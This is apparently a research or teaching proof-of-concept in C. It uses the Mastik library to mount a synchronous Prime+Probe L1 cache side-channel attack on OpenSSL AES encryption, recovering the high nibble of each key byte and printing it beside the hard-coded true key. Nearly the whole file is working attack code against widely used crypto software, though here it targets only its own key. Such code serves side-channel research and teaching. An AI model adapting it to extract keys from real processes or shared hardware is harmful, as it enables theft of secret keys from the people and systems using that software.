/* Prime+Probe */

#include <string.h>
#include <stdio.h>
#include <stdint.h>

#include <mastik/util.h>
#include <mastik/synctrace.h>
#include <openssl/aes.h>

#define AES_SIZE 16

void analyse(int64_t data[256][1024], int *key, int *offset) {
    int64_t max = INT64_MIN;

    for (int guess = 0; guess < 16; guess++) 
    {
        for (int off = 0; off < L1_SETS; off++) 
        {
            int64_t sum = 0LL;
            for (int pt = 0; pt < 16; pt++) 
            {
                int set = (off + (pt ^ guess)) % L1_SETS;
                sum += data[pt << 4][set];
            }
            if (sum > max) 
            {
                max = sum;
                *key = guess;
                *offset = off;
            }
        }
    }
}

void crypto(uint8_t *input, uint8_t *output, void *data)
{
    AES_KEY *aeskey = (AES_KEY *)data;
    AES_encrypt(input, output, aeskey);
}

int main(int argc, char** argv)
{
    const uint8_t key[] = 
    {
        0x0f, 0x1e, 0x2d, 0x3c, 0x4b, 0x5a, 0x69, 0x78,
        0x87, 0x96, 0xa5, 0xb4, 0xc3, 0xd2, 0xe1, 0xf0
    };

    AES_KEY aeskey;
    AES_set_encrypt_key(key, 128, &aeskey);


    delayloop(1000000000);

    st_clusters_t clusters = syncPrimeProbe(1000000,
                                            AES_SIZE,
                                            1,
                                            NULL,
                                            NULL,
                                            crypto,
                                            &aeskey,
                                            0xf0,
                                            1);

    printf("              guess key\n");
    for (int i = 0; i < AES_SIZE; i++)
    {
        int guess, offset;
        printf("Key byte %2d: ", i);
        analyse(clusters[i].avg, &guess, &offset);
        printf(" %1x", guess);
        printf("    ");
        printf(" %.2x", key[i]);
        printf("\n");
    }
    

    return 0;
}